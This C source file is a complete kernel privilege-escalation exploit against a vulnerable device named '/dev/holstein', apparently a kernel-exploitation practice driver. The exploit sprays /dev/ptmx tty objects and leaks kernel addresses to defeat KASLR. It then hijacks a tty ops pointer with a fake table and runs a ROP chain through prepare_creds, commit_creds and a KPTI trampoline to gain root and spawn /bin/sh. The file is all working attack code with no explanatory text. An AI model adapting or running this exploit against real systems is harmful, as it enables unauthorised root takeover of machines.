#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>

unsigned long offset;
unsigned long g_buf;
char buf[0x1000];

unsigned long long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void shell(void) {
  puts("[+] shell");
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  system("whoami");
  execve("/bin/sh", argv, envp);
}

int main() {
  save_state();
  int spray[100];
  for (int i = 0; i < 50; ++i) {
    spray[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (spray[i] == -1) {
      puts("[!] open error");
      return -1;
    }
  }

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) {
    puts("[!] error opening holstein");
    return -2;
  }

  for (int i = 50; i < 100; ++i) {
    spray[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (spray[i] == -1) {
      puts("[!] open error");
      return -3;
    }
  }

  read(fd, buf, 0x440);
  unsigned long leak = *(unsigned long*)&buf[0x418];
  
  printf("[+] leak: %p\n", (void*)leak);
  offset = leak - 0xffffffff81c38880;
  printf("[+] offset: %lx\n", offset);

  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] gbuf: 0x%lx\n", g_buf);


  // 0xffffffff812be4c8: push %rcx; add 0x41(%rbx), %ebx; pop %rsp; pop %rbp; ret;
  unsigned long stack_pivot = 0xffffffff815f7e60+offset;

  unsigned long prepare_creds = 0xffffffff81074650+offset; 
  unsigned long commit_creds = 0xffffffff810744b0+offset;
  unsigned long pop_rdi = 0xffffffff810d748d+offset;
  // 0xffffffff81299919: mov %rax, %rdi; pop %r13; pop %r14; mov %rdi, %rax; pop %r15; pop %rbp; ret; 
  unsigned long mov_rax_rdi = 0xffffffff81299919+offset;
  unsigned long kpti_trampoline = 0xffffffff81800e26+offset;
  

  *(unsigned long*)&buf[0x418] = g_buf;
  for (size_t i = 0; i < 0x200/8; ++i) {
    ((unsigned long*)buf)[i] = stack_pivot;
  }
  unsigned long *rop = (unsigned long*)(buf+0x200);
  *rop++ = 0xc0fe;
  *rop++ = 0xc0fe;
  *rop++ = pop_rdi;
  *rop++ = 0;
  *rop++ = prepare_creds;
  *rop++ = mov_rax_rdi;
  *rop++ = 0xdead;
  *rop++ = 0xdead;
  *rop++ = 0xdead;
  *rop++ = 0xdead;
  *rop++ = commit_creds;
  *rop++ = kpti_trampoline;
  *rop++ = 0xbeef;
  *rop++ = 0xbeef;
  *rop++ = (unsigned long)shell+1;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;
  
  write(fd, buf, 0x440);
  for (size_t i = 0; i < 100; ++i) {
    //ioctl(spray[i], (unsigned long)g_buf+0x200, 0x62626262);
    ioctl(spray[i], 0xdead, g_buf+0x200);
  }

  getchar();
  
  close(fd);
  
  return 0;
}
